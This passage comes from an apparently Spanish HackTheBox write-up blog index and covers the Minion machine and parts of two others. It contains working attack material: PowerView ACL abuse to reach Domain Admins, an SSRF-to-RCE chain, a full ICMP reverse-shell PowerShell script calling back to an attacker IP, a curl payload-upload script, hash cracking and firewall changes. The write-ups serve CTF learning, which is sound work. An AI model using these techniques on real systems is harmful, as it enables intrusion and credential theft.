kerberoasting attack, pero si lo tratamos de realizar no podremos crackear la contraseña debido a que la contraseña del usuario maria es bastante robusta. Pero dado que con este privilegio podemos modificar los atributos de un usuario, vamos a tratar de aprovecharnos de este privilegio asignando un script de inicio de sesión al perfil de maria, de este modo cada vez que inicie sesión puedo hacer que ejecute un script que podemos definirnos. Pero para ello debemos de usar la función Set-DomainObject que se encuentra en PowerView. ps1, asi que vamos a volver a importarlo. *Evil-WinRM* PS C:\ProgramData\Privesc&gt; Import-Module . \PowerView. ps1Despues vamos a crear un script test. ps1 que copie todos los archivos del escritorio de maria a mi ruta actual. *Evil-WinRM* PS C:\ProgramData\Privesc&gt; echo  copy C:\Users\Maria\Desktop\* C:\ProgramData\Privesc\  &gt; test. ps1*Evil-WinRM* PS C:\ProgramData\Privesc&gt; Set-DomainObject -Identity maria -SET @{scriptpath='C:\ProgramData\Privesc\test. ps1'}Listamos los archivos y vemos un archivo Engine. xsl que vamos a traernos a nuestro equipo.  Abrimos el archivo con libreoffice. ❯ ls 20231026165356_BloodHound. zip  config. xml  credentials. txt  Engines. xls  hudson. util. Secret  jenkins-credentials-decryptor  master. key  PowerView. ps1  SharpHound. ps1❯ libreoffice Engines. xls Probamos las contraseña y obtenemos nuevas credenciales validas, maria:W3llcr4ft3d_4cls, nos conectamos y ahora somos el usuario maria. ❯ evil-winrm -i 10. 10. 11. 132 -u 'maria' -p 'W3llcr4ft3d_4cls'                    Evil-WinRM shell v3. 5                    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                    Data: For more information, check Evil-WinRM GitHub: https://github. com/Hackplayers/evil-winrm#Remote-path-completion                    Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\maria\Documents&gt; whoamiobject\mariaAhora como maria vemos que tenemos el privilegio de WriteOwner sobre Domain Admins y ya con esto podriamos asignarnos el grupo Domain Admins.  Si vemos el abuse info nuevamente podemos ver que nos indica una forma en la que podemos hacerlo, para ello vamos a ejecutar lo siguiente, pero no sin antes volver a importar el PowerView. ps1.  *Evil-WinRM* PS C:\ProgramData\Privesc&gt; Import-Module . \PowerView. ps1*Evil-WinRM* PS C:\ProgramData\Privesc&gt; Set-DomainObjectOwner -Identity  Domain Admins  -OwnerIdentity maria*Evil-WinRM* PS C:\ProgramData\Privesc&gt; Add-DomainObjectAcl -TargetIdentity  Domain Admins  -Rights All -PrincipalIdentity mariaVemos los grupos del usuario maria y ya se encuentra en Domain Admins. *Evil-WinRM* PS C:\ProgramData\Privesc&gt; net user mariaUser name          mariaFull Name          maria garciaCommentUser's commentCountry/region code     000 (System Default)Account active        YesAccount expires       NeverPassword last set      10/21/2021 9:16:32 PMPassword expires       NeverPassword changeable     10/22/2021 9:16:32 PMPassword required      YesUser may change password   YesWorkstations allowed     AllLogon script         C:\ProgramData\Privesc\test. ps1User profileHome directoryLast logon          10/26/2023 2:25:15 PMLogon hours allowed     AllLocal Group Memberships   *Remote Management UseGlobal Group memberships   *Domain Admins    *Domain UsersThe command completed successfully. Ahora tendriamos que volver a conectarnos para actualizar los permisos, dirigirnos al directorio personal del usuario Administrator y visualizar la segunda flag root. txt. ❯ evil-winrm -i 10. 10. 11. 132 -u 'maria' -p 'W3llcr4ft3d_4cls'                    Evil-WinRM shell v3. 5                    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                    Data: For more information, check Evil-WinRM GitHub: https://github. com/Hackplayers/evil-winrm#Remote-path-completion                    Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\maria\Documents&gt; cd C:\Users\Administrator\Desktop*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root. txt923cbfd8245771bc2a485f96fb451072"
    }, {
    "id": 12,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Minion",
    "title": "Maquina Minion - htb writeup",
    "body": "2023/10/17 - El dia de hoy vamos a resolver Minion de hackthebox una maquina windows de dificultad insane, esta vez vamos contra una maquina potente donde a traves de un servicio http vamos a aprovecharnos de un SSRF para descubrir un puerto interno local que a traves de un parametro nos permitira realizar RCE, pero al existir reglas de firewall implementadas por TCP y por UDP ganaremos acceso por ICMP, despues abusaremos de los permisos de un script en powershell para mediante una tarea programada obtener unas contraseñas privilegiadas y finalmente manipularemos las reglas de firewall para habilitarnos el acceso a los puertos internos de la maquina y poder ejecutar un exe que nos permitira visualizar la root. txt como el usuario Administrator. Maquina muy guapa asi que vamos a darle!. Comenzamos como es de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Minion❯ ls MinionSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 57PING 10. 10. 10. 57 (10. 10. 10. 57) 56(84) bytes of data. 64 bytes from 10. 10. 10. 57: icmp_seq=1 ttl=127 time=194 ms--- 10. 10. 10. 57 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 193. 546/193. 546/193. 546/0. 000 msVemos que la maquina nos responde, con un ttl de 127 y por proximidad seria correspondiente a una maquina windows. ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 57 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 93 ( https://nmap. org ) at 2023-10-15 17:12 -05Initiating SYN Stealth Scan at 17:12Scanning 10. 10. 10. 57 [65535 ports]Discovered open port 62696/tcp on 10. 10. 10. 57Completed SYN Stealth Scan at 17:13, 26. 44s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 57Host is up, received user-set (0. 12s latency). Scanned at 2023-10-15 17:12:41 -05 for 27sNot shown: 65534 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON62696/tcp open unknown syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 26. 55 seconds      Raw packets sent: 131083 (5. 768MB) | Rcvd: 15 (660B)ESCANEO DE VERSION Y SERVICIOS: ❯ nmap -sCV -p62696 10. 10. 10. 57 -oN targetedStarting Nmap 7. 93 ( https://nmap. org ) at 2023-10-15 17:14 -05Nmap scan report for 10. 10. 10. 57Host is up (0. 16s latency). PORT   STATE SERVICE VERSION62696/tcp open http  Microsoft IIS httpd 8. 5| http-methods: |_ Potentially risky methods: TRACE| http-robots. txt: 1 disallowed entry |_/backend|_http-server-header: Microsoft-IIS/8. 5|_http-title: Site doesn't have a title (text/html). Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21. 61 secondsEntre los puertos abiertos mas relevantes podemos visualizar:       Puerto   Servicio   Versión         62696   HTTP   Microsoft IIS httpd 8. 5   EXPLOTACION #: Como vemos que el puerto 62696 corresponde a un servicio web con whatweb vamos a tratar de enumear las tecnolologias que utiliza y tal como nos muestra nmap nos enfrentamosa un IIS. ❯ whatweb http://10. 10. 10. 57:62696http://10. 10. 10. 57:62696 [200 OK] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/8. 5], IP[10. 10. 10. 57], Microsoft-IIS[8. 5], X-Powered-By[ASP. NET]Procedemos a abrir el servicio en nuestro navegador y visualizamos una pagina referente a minions.  Como nos enfrentamos a un IIS, con wfuzz podemos tratar de fuzzear archivos con extensiones asp y aspx. ❯ wfuzz -c --hc=404 -t 150 -w /usr/share/wordlists/dirbuster/directory-list-2. 3-medium. txt -z list,asp-aspx -u http://10. 10. 10. 57:62696/FUZZ. FUZ2Z********************************************************* Wfuzz 3. 1. 0 - The Web Fuzzer             *********************************************************Target: http://10. 10. 10. 57:62696/FUZZ. FUZ2ZTotal requests: 441120=====================================================================ID      Response  Lines  Word    Chars    Payload                                                        =====================================================================000001221:  200    0 L   7 W    41 Ch     test - asp     visualizamos la ruta test. asp y observamos que nos solicita el parametro u para realizar la solicitud.  Haciendo uso del parametro, podemos tratar de enviarnos una petición hacia nuestro equipo pero vemos falla.  Recordemos pero que tambien podemos realizar peticiones apuntando hacia la propia maquina y en efecto vemos contenido en el puerto 80 en local.  Entre las opciones que tenemos podemos ver system commands y si hacemos hovering nos muestra la ruta cmd. aspx, asi que podemos tratar de llegar a esta con la petición interna.  Si tratamos de ejecutar un comando nos muestra un error, pero si inspeccionamos el codigo fuente vemos que necesitamos incorporar el parametro xcmd.  Probamos nuevamente a ejecutar un comando, esta vez mandando una traza a nuestra maquina host, obtenemos un exit status = 0 y recibimos la petición correctamente.  ❯ tcpdump -i tun0 icmp -vtcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes17:40:07. 142661 IP (tos 0x0, ttl 127, id 6473, offset 0, flags [none], proto ICMP (1), length 60)  10. 10. 10. 57 &gt; 10. 10. 16. 10: ICMP echo request, id 1, seq 1, length 4017:40:07. 142685 IP (tos 0x0, ttl 64, id 60344, offset 0, flags [none], proto ICMP (1), length 60)  10. 10. 16. 10 &gt; 10. 10. 10. 57: ICMP echo reply, id 1, seq 1, length 40Si ahora que tenemos RCE podemos tratar de enviarnos una reverse shell a nuestra maquina, pero no va a ser posible puesto que por dentro existen reglas de firewall que evitan que ganemos acceso por tcp y por udp. Pero podriamos entablarnos una reverse shell por ICMP ya que tenemos traza con nuestra maquina, para ello vamos a usar el script Invoke-PowerShellIcmp. ps1 del repositorio de nishang:  Invoke-PowerShellIcmp. ps1Cateamos el script y vemos que necesitamos ejecutar dos comandos y uno de ellos ejecuta el script icmpsh_m. py que necesitamos descargar.  Nos descargamos el archivo y ejecutamos los comandos.  icmpsh_m. pyAhora para evitar problemas en el script Invoke-PowerShellIcmp. ps1 vamos a quitar todos los comentarios, tambien las lineas vacias y agregar al final Invoke-PowerShellIcmp -IPAddress 10. 10. 16. 10, para que al interpretarse ejecute la instrucción. cat Invoke-PowerShellIcmp. ps1 | sed '/^\s*$/d' &gt; icmp. ps1❯ cat icmp. ps1function Invoke-PowerShellIcmp{   [CmdletBinding()] Param(    [Parameter(Position = 0, Mandatory = $true)]    [String]    $IPAddress,    [Parameter(Position = 1, Mandatory = $false)]    [Int]    $Delay = 5,    [Parameter(Position = 2, Mandatory = $false)]    [Int]    $BufferSize = 128  )  $ICMPClient = New-Object System. Net. NetworkInformation. Ping  $PingOptions = New-Object System. Net. NetworkInformation. PingOptions  $PingOptions. DontFragment = $True  $sendbytes = ([text. encoding]::ASCII). GetBytes( Windows PowerShell running as user   + $env:username +   on   + $env:computername +  `nCopyright (C) 2015 Microsoft Corporation. All rights reserved. `n`n )  $ICMPClient. Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null  $sendbytes = ([text. encoding]::ASCII). GetBytes('PS ' + (Get-Location). Path + '&gt; ')  $ICMPClient. Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null  while ($true)  {    $sendbytes = ([text. encoding]::ASCII). GetBytes('')    $reply = $ICMPClient. Send($IPAddress,60 * 1000, $sendbytes, $PingOptions)    if ($reply. Buffer)    {      $response = ([text. encoding]::ASCII). GetString($reply. Buffer)      $result = (Invoke-Expression -Command $response 2&gt;&amp;1 | Out-String )      $sendbytes = ([text. encoding]::ASCII). GetBytes($result)      $index = [math]::floor($sendbytes. length/$BufferSize)      $i = 0      if ($sendbytes. length -gt $BufferSize)      {        while ($i -lt $index )        {          $sendbytes2 = $sendbytes[($i*$BufferSize). . (($i+1)*$BufferSize-1)]          $ICMPClient. Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null          $i +=1        }        $remainingindex = $sendbytes. Length % $BufferSize        if ($remainingindex -ne 0)        {          $sendbytes2 = $sendbytes[($i*$BufferSize). . ($sendbytes. Length)]          $ICMPClient. Send($IPAddress,60 * 10000, $sendbytes2, $PingOptions) | Out-Null        }      }      else      {        $ICMPClient. Send($IPAddress,60 * 10000, $sendbytes, $PingOptions) | Out-Null      }      $sendbytes = ([text. encoding]::ASCII). GetBytes( `nPS   + (Get-Location). Path + '&gt; ')      $ICMPClient. Send($IPAddress,60 * 1000, $sendbytes, $PingOptions) | Out-Null    }    else    {      Start-Sleep -Seconds $Delay    }  }}Invoke-PowerShellIcmp -IPAddress 10. 10. 16. 10Lo que tenemos que hacer ahora es meter este script en la maquina victima, pero debemos hacerlo en un formato en la que powershell lo entienda por ello usaremos iconv para separ cada caracter y despues convertirlo en base64. cat icmp. ps1 | iconv -t utf-16le | base64 -w 0 &gt; icmp. ps1. b64Ahora vamos a crear un script en bash que nos ayude a automatizar la inserción de nuestro script en la maquina victima, vamos a utilizar curl pero como tiene un numero limite de caracteres por linea que podemos enviar, a nuestro script icmp. ps1. b64 vamos a aplicarle el comando fold para que tenga un numero de caracteres igual por cada linea y asi evitar problemas. ❯ /bin/cat automatize. sh#!/bin/bashfunction ctrl_c(){  echo -e  \[!] Saliendo. . .    tput cnorm; exit 1}#CTRL_Ctrap ctrl_c INTdeclare -r main_url= http://10. 10. 10. 57:62696/test. asp?u=http://localhost/cmd. aspx counter=0echo; tput civis; for line in $(cat icmp. ps1. b64); do   command= echo $line &gt;&gt; C:\Temp\script. ps1   echo -ne  [+] Total de lineas enviadas [$counter/87]\r   curl -s -X GET -G $main_url --data-urlencode  xcmd=$command  &amp;&gt;/dev/null  let counter+=1done; tput cnormAl ejecutar el script lo que hara sera crear el archivo script. ps1 en la ruta C:\Temp\ con el contenido del icmp. ps1. b64, esto podemos verificarlo si desde el navegador le hacemos un type para leerlo y nos muestra con exist status 0.  Para poder ejcutarlo primero debemos transformar la data a un codigo legible por powershell ya que esta se encuentra en base64, para ello usaremos los siguientes comandos ejecutados desde una powershell. ❯ pwshPowerShell 7. 2. 1Copyright (c) Microsoft Corporation. https://aka. ms/powershellType 'help' to get help. Welcome to Parrot OS ┌[parrot@root]-[10:48-16/10]-[/home/fmiracle/machines/Minion/content]└╼$ $fileContent = Get-Content . /icmp. ps1. b64┌[parrot@root]-[10:51-16/10]-[/home/fmiracle/machines/Minion/content]└╼$ $fileDecode = [System. Text. Encoding]::Unicode. GetString([System. Convert]::FromBase64String($fileContent))De esta manera similar tendriamos que introducirlo en la maquina, pero aputando al archivo script. ps1 en la maquina victima.  Si leemos el nuevo archivo, vemos que lo creamos de manera existosa.  Ahora no olvidemos ejcutar los comandos que requeria el script, usare rlwrap para tener un mejor manejo de la consola. ❯ sysctl -w net. ipv4. icmp_echo_ignore_all=1❯ rlwrap python icmpsh_m. py 10. 10. 16. 10 10. 10. 10. 57Ahora que estamos en escucha solo debemos ejecutar el script y recibimos la conexión.  ❯ rlwrap python icmpsh_m. py 10. 10. 16. 10 10. 10. 10. 57Windows PowerShell running as user MINION$ on MINIONCopyright (C) 2015 Microsoft Corporation. All rights reserved. whoamiiis apppool\defaultapppoolAhora al tratar de listar el directorio personal del usuario decoder. MINION, no tenemos acceso: Pero si listamos la raiz, vemos un directorio sysadmscripts.  Dentro vemos dos archivos uno . bat y un script en powershell.  Vemos que el del_logs. bat ejecuta el c. ps1 y como es de borrado de logs, quiero pensar que hay una tarea programada que lo ejecuta a intervalos regulares de tiempo. Si vemos los permisos del script c. ps1 todos tienen privilegios full sobre este, entonces podemos tratar de manipularlo y traernos los archivos del directorio del usuario decoder. MINION asumiendo que este usuario es el que realiza la ejecución de la tarea o otro con mas privilegios.  Listamos el directorio despues de unos minutos y vemos un backup. zip y la flag user. txt que procederemos a leer.  ELEVACION DE PRIVILEGIOS #: Vemos que ademas de la flag, obtuvimos un archivo comprimido backup. zip, que si bien podemos descomprimirlo no vamos a encontrar información relevante, por ello debemos pensar fuera de la caja y preguntarnos que formas existen en windows para ocultar información o metadatos. Por ello debemos tener en cuenta el concepto de los Alternative Data Streams - ADS.  ADS: Los Flujos Alternativos de Datos, Alternate Data Streams o ADS son una característica del sistema de archivos NTFS que permite almacenar metainformación con un fichero, sin necesidad de usar un fichero separado para almacenarla. Para poder ver si hay configurados ADS en una ruta, debemos ejecutar el siguiente comando: Vemos que el archivo backup. zip tiene una ADS pass, asi que leemos el contenido y encontramos un hash en md5. type C:\Temp\backup. zip:pass28a5d1e0c15af9f8fce7db65d75bbf17Lo crackeamos usando nuestra pagina de confianza y obtenemos una contraseña.  https://crackstation. net/ Si bien contamos con credenciales, no podemos conectarnos con evil-winrm o con psexec debido a que solo vemos abierto el puerto 62696, pero podemos hacer uso de PSCredential y ejecutar un comando a traves de ScriptBlock. hostnameminion    $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System. Management. Automation. PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { whoami } minion\administratorAhora podriamos tratar de ejecutar leer la segunda flag, vemos que antes tenemos que ejecutar el root. exe, pero curiosamente no podemos hacerlo desde aqui.     $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System. Management. Automation. PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { type C:\Users\Administrator\Desktop\root. txt }In order to get the flag you have to launch root. exe located in this folder!    $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System. Management. Automation. PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { C:\Users\Administrator\Desktop\root. exe }Are you trying to cheat me?Ahora recordemos que tenemos privilegios como administradores, asi que podemos tratar de modificar las reglas de firewall, de modo que tengamos acceso a los puertos que estan abiertos internamente en la maquina.     $user = 'minion\Administrator'; $pass = '1234test'; $secPass = ConvertTo-SecureString $pass -AsPlainText -Force; $cred = New-Object System. Management. Automation. PSCredential $user,$secPass; Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock { New-NetFirewallRule -DisplayName fmiracle -RemoteAddress 10. 10. 16. 10 -Direction inbound -Action allow }Name          : {fe96175f-38d1-451f-ad74-95e144f0d702}ID           : {fe96175f-38d1-451f-ad74-95e144f0d702}Group          : Platform        : {}LSM           : FalseProfile         : AnyPSComputerName     : localhostRunspaceId       : 3cd818dd-a33a-4cf9-85a5-069c0144cf18Caption         : Description       : ElementName       : fmiracleInstanceID       : {fe96175f-38d1-451f-ad74-95e144f0d702}Si ahora tratamos de ver los puertos abiertos de la maquina. ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 57Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 93 ( https://nmap. org ) at 2023-10-16 12:50 -05Initiating SYN Stealth Scan at 12:50Scanning 10. 10. 10. 57 [65535 ports]Discovered open port 445/tcp on 10. 10. 10. 57Discovered open port 135/tcp on 10. 10. 10. 57Discovered open port 139/tcp on 10. 10. 10. 57Discovered open port 80/tcp on 10. 10. 10. 57Discovered open port 3389/tcp on 10. 10. 10. 57Discovered open port 49153/tcp on 10. 10. 10. 57Discovered open port 49154/tcp on 10. 10. 10. 57Discovered open port 49157/tcp on 10. 10. 10. 57Discovered open port 62696/tcp on 10. 10. 10. 57Discovered open port 49152/tcp on 10. 10. 10. 57Discovered open port 49156/tcp on 10. 10. 10. 57Discovered open port 49155/tcp on 10. 10. 10. 57Discovered open port 5985/tcp on 10. 10. 10. 57Discovered open port 47001/tcp on 10. 10. 10. 57Completed SYN Stealth Scan at 12:51, 27. 30s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 57Host is up, received user-set (0. 21s latency). Scanned at 2023-10-16 12:50:43 -05 for 28sNot shown: 65521 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE    REASON80/tcp  open http     syn-ack ttl 127135/tcp  open msrpc     syn-ack ttl 127139/tcp  open netbios-ssn  syn-ack ttl 127445/tcp  open microsoft-ds syn-ack ttl 1273389/tcp open ms-wbt-server syn-ack ttl 1275985/tcp open wsman     syn-ack ttl 12747001/tcp open winrm     syn-ack ttl 12749152/tcp open unknown    syn-ack ttl 12749153/tcp open unknown    syn-ack ttl 12749154/tcp open unknown    syn-ack ttl 12749155/tcp open unknown    syn-ack ttl 12749156/tcp open unknown    syn-ack ttl 12749157/tcp open unknown    syn-ack ttl 12762696/tcp open unknown    syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 27. 38 seconds      Raw packets sent: 131072 (5. 767MB) | Rcvd: 40 (1. 600KB)Podriamos tratar de conectarnos por a traves del puerto 3389 por RDP, ejecutar el root. txt y visualizar la segunda flag root. txt.  "
    }, {
    "id": 13,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Monteverde",
    "title": "Maquina Monteverde - htb writeup",
    "body": "2023/10/13 - El dia de hoy vamos a resolver Monteverde de hackthebox una maquina windows de dificultad media, para esta ocasión vamos a volver a enfrentarnos contra un DC donde obtendremos usuarios a traves de rpc y con ayuda de crackmapexec mediante un ataque de fuerza bruta conseguiremos credenciales validas, que nos permitiran listar los recursos compartidos del sistema y conectarnos con otras credenciales al sistema y finalmente abusaremos del grupo Azure Admins para explotar un Azure AD Sync con lo que nos haremos con las credenciales administrativas del dominio. Maquina interesenta asi que vamos a darle!. Comenzamos como de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Monteverde❯ ls MonteverdeSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 172PING 10. 10. 10. 172 (10. 10. 10. 172) 56(84) bytes of data. 64 bytes from 10. 10. 10. 172: icmp_seq=1 ttl=127 time=147 ms--- 10. 10. 10. 172 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 147. 473/147. 473/147. 473/0. 000 msVemos que la maquina nos responde, con un ttl de 127 y por proximidad seria correspondiente a una maquina windows. ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 172 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 93 ( https://nmap. org ) at 2023-10-13 17:17 -05Initiating SYN Stealth Scan at 17:17Scanning 10. 10. 10. 172 [65535 ports]Discovered open port 139/tcp on 10. 10. 10. 172Discovered open port 53/tcp on 10. 10. 10. 172Discovered open port 445/tcp on 10. 10. 10. 172Discovered open port 135/tcp on 10. 10. 10. 172Discovered open port 49676/tcp on 10. 10. 10. 172Discovered open port 593/tcp on 10. 10. 10. 172Discovered open port 49667/tcp on 10. 10. 10. 172Discovered open port 49674/tcp on 10. 10. 10. 172Discovered open port 9389/tcp on 10. 10. 10. 172Discovered open port 5985/tcp on 10. 10. 10. 172Discovered open port 3269/tcp on 10. 10. 10. 172Discovered open port 636/tcp on 10. 10. 10. 172Discovered open port 464/tcp on 10. 10. 10. 172Discovered open port 49673/tcp on 10. 10. 10. 172Discovered open port 64934/tcp on 10. 10. 10. 172Discovered open port 389/tcp on 10. 10. 10. 172Discovered open port 88/tcp on 10. 10. 10. 172Discovered open port 49697/tcp on 10. 10. 10. 172Discovered open port 3268/tcp on 10. 10. 10. 172Completed SYN Stealth Scan at 17:18, 40. 69s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 172Host is up, received user-set (0. 18s latency). Scanned at 2023-10-13 17:17:44 -05 for 40sNot shown: 65516 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE     REASON53/tcp  open domain      syn-ack ttl 12788/tcp  open kerberos-sec   syn-ack ttl 127135/tcp  open msrpc      syn-ack ttl 127139/tcp  open netbios-ssn   syn-ack ttl 127389/tcp  open ldap       syn-ack ttl 127445/tcp  open microsoft-ds   syn-ack ttl 127464/tcp  open kpasswd5     syn-ack ttl 127593/tcp  open http-rpc-epmap  syn-ack ttl 127636/tcp  open ldapssl     syn-ack ttl 1273268/tcp open globalcatLDAP  syn-ack ttl 1273269/tcp open globalcatLDAPssl syn-ack ttl 1275985/tcp open wsman      syn-ack ttl 1279389/tcp open adws       syn-ack ttl 12749667/tcp open unknown     syn-ack ttl 12749673/tcp open unknown     syn-ack ttl 12749674/tcp open unknown     syn-ack ttl 12749676/tcp open unknown     syn-ack ttl 12749697/tcp open unknown     syn-ack ttl 12764934/tcp open unknown     syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 40. 80 seconds      Raw packets sent: 196591 (8. 650MB) | Rcvd: 39 (1. 716KB)ESCANEO DE VERSION Y SERVICIOS: ❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49697,64934 10. 10. 10. 172 -oN targetedStarting Nmap 7. 93 ( https://nmap. org ) at 2023-10-13 17:19 -05Nmap scan report for 10. 10. 10. 172Host is up (0. 66s latency). PORT   STATE SERVICE    VERSION53/tcp  open domain    Simple DNS Plus88/tcp  open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-13 22:19:56Z)135/tcp  open msrpc     Microsoft Windows RPC139/tcp  open netbios-ssn  Microsoft Windows netbios-ssn389/tcp  open ldap     Microsoft Windows Active Directory LDAP (Domain: MEGABANK. LOCAL0. , Site: Default-First-Site-Name)445/tcp  open microsoft-ds?464/tcp  open kpasswd5?593/tcp  open ncacn_http  Microsoft Windows RPC over HTTP 1. 0636/tcp  open tcpwrapped3268/tcp open ldap     Microsoft Windows Active Directory LDAP (Domain: MEGABANK. LOCAL0. , Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found9389/tcp open mc-nmf    . NET Message Framing49667/tcp open msrpc     Microsoft Windows RPC49673/tcp open ncacn_http  Microsoft Windows RPC over HTTP 1. 049674/tcp open msrpc     Microsoft Windows RPC49676/tcp open msrpc     Microsoft Windows RPC49697/tcp open msrpc     Microsoft Windows RPC64934/tcp open msrpc     Microsoft Windows RPCService Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: -1s| smb2-time: |  date: 2023-10-13T22:20:53|_ start_date: N/A| smb2-security-mode: |  311: |_  Message signing enabled and requiredService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 113. 74 secondsEntre los puertos abiertos mas relevantes podemos visualizar:       Puerto   Servicio   Versión         53   DNS   Simple DNS Plus       88   KERBEROS   Microsoft Windows Kerberos       135   MSRPC   Microsoft Windows RPC       139   NETBIOS   Microsoft Windows netbios-ssn       445   SMB   ?       3268   LDAP   Microsoft Windows Active Directory LDAP       5985   WINRM   Microsoft HTTPAPI httpd 2. 0   EXPLOTACION #: Como vemos que el puerto 445 esta abierto, con crackpamexec vamos a tratar de enumerar a lo que nos enfrentamos. ❯ crackmapexec smb 10. 10. 10. 172SMB     10. 10. 10. 172  445  MONTEVERDE    [*] Windows 10. 0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK. LOCAL) (signing:True) (SMBv1:False)Podemos ver que estamos ante un Windows 10, ahora tambien vemos el dominio asociado para agregarlo a nuestro /etc/hosts. ❯ echo  10. 10. 10. 172 MEGABANK. LOCAL  &gt;&gt; /etc/hostsComo nos enfrentamos contra un Domain Controller podemos tratar de enumerar usuarios validos con rpclient a traves de un null session. ❯ rpcclient -U '' 10. 10. 10. 172 -N -c 'enumdomusers' | grep -oP '\[. *?\]' | grep -v 0x | tr -d '[]'GuestAAD_987d7f2f57d2mhopeSABatchJobssvc-atasvc-bexecsvc-netappdgalanosrolearysmorganGuardamos las credenciales en un archivo de nombre users. txt y podemos tratar de efectuar un ASREProast Attack para tratar de obtener un TGT - ticket granting ticket, pero no da resultado. ❯ GetNPUsers. py -no-pass -usersfile users. txt MEGABANK. LOCAL/Impacket v0. 11. 0 - Copyright 2023 Fortra[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User AAD_987d7f2f57d2 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User mhope doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User SABatchJobs doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User svc-ata doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User svc-bexec doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User svc-netapp doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User 